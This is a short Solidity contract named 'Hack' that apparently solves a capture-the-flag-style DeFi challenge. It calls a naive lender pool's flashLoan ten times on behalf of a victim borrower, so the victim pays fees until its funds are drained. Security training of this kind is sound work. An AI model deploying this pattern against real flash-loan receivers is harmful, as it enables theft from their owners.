// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "./NaiveReceiverLenderPool.sol";


contract Hack {
    
    function hack(address payable pool, address borrower) public {
        for (uint i = 0; i < 10; i++) {
            NaiveReceiverLenderPool(pool).flashLoan(borrower, 0);
        }
    }
}
